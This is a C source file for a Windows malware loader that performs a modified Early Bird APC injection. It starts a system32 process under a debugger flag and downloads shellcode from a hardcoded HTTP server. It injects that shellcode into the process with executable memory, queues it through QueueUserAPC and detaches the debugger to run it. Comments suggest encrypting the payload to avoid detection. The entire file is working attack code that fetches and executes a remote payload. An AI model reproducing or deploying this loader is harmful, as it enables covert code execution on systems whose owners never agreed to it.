#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma warning (disable:4996)

//TARGET_PROCESS will be searched in C:\Windows\system32 because of GetEnvironmentVariableA. If we want other path, we would need to get another path from function
#define TARGET_PROCESS "hvix64.exe"
#define URL_SHELLCODE L"http://192.168.0.122/shellcode.bin"
// To make it not staged, use local file or paste the shellcode inside (remember its better to encrypt it or encode it before)

//Implemented:
//Logic - Modified Early Bird APC Injection (2):
//1. Use CreateProcess with DEBUG_PROCESS flag instead of SUSPENDED (attaching the debugger which is our malware)
//2. Download the payload from the server
//3. Inject payload into target process address space
//4. Get the debugged thread's handle from CreateProcess along with the payload's base address and pass them to QueueUserAPC
//5. Detach the target process with DebugActiveProcessStop to stop and remove the debugger and also resume the thread and execute payload

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    //Clean the structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    //set the size of structure
    Si.cb = sizeof(STARTUPINFO);

    //get the %windir& env var path 
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //create the target process path for CreateProcessA
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    //create the process with DEBUG_PROCESS
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA failed with error: %d", GetLastError());
        return FALSE;
    }

    //fill up the OUTPUT params with CreateProcessA output
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    //checks
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
                hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL,
                pTmpBytes = NULL;

    hInternet = InternetOpenW(L"msfrulz", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}


int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;
	SIZE_T shellcodeSize = NULL;
    PBYTE shellcode = NULL;

    //create target remote process in debugged state
    if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        printf("[!] CreateSuspendedProcess2 failed with error: %d\n", GetLastError());
        return -1;
    }

    //download the payload from the server
	GetPayloadFromUrl(URL_SHELLCODE, &shellcode, &shellcodeSize);

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, shellcodeSize, &pAddress)) {
        printf("[!] InjectShellcodeToRemoteProcess failed with error: %d\n", GetLastError());
        return -1;
    }
    //queue the APC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}

